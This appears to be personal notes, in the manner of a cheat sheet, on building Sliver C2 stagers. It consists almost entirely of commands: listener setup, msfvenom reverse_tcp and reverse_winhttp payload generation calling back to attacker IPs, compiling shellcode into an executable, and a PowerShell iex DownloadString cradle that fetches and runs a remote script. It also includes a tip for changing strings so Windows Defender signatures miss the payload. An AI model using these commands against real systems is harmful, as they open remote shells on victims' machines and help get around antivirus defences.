# Stagers

```bash
# MSF Venom for boxes
mtls -L 192.168.45.163 -l 8888
profiles new --mtls 192.168.45.163 --format shellcode win-shellcode
stage-listener --url http://192.168.45.163:1234 --profile win-shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=1234 LURI=/hello.woff -f exe -o stager.exe
cmd.exe stager.exe


## REDONE
# Real Scenario based on https://www.youtube.com/watch?v=3uHNyTZvbqs
mtls -L 192.168.45.163 -l 9900
profiles new --mtls 192.168.45.163:9900 -l -f shellcode m_shellcode
stage-listener -u http://192.168.45.163:9443 -p m_shellcode
stage-listener -u tcp://192.168.45.163:1234 -p m_shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=9443 LURI=/hello.woff -f exe -o http.exe
msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.163 LPORT=1234 -f exe -o tcp.exe

# bypassing defender
1. Use sliver docs custom C# script and change strings so it does not have signature checks

# Need to do stagers beacons from video above

```

---

# Stagers revisited

```bash
# Create  profile for mtls
profiles new --mtls 192.168.2.63:8888 --skip-symbols --format shellcode --arch amd64 win64

# start a listener
mtls -L 192.168.2.63 -l 8888

# start stager listener for tcp
stage-listener --url tcp://192.168.2.63:8443 --profile win64

# start stager listener for http
stage-listener --url http://192.168.2.63:80 --profile win64

# Generate the stager tcp
generate stager --lhost 192.168.2.63 --lport 8443 --arch amd64 --format c --save shellcode.c
msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.2.63 LPORT=8443 -f c -o shellcode.c
# Add shellcode to stager.c and compile
x86_64-w64-mingw32-gcc -o tcp.exe stager.c

# Stager for http let's use powershell
#Use powershell script and change ip of machine
iex (New-Object Net.WebClient).DownloadString("http://192.168.2.63:8000/stager.ps1")

```
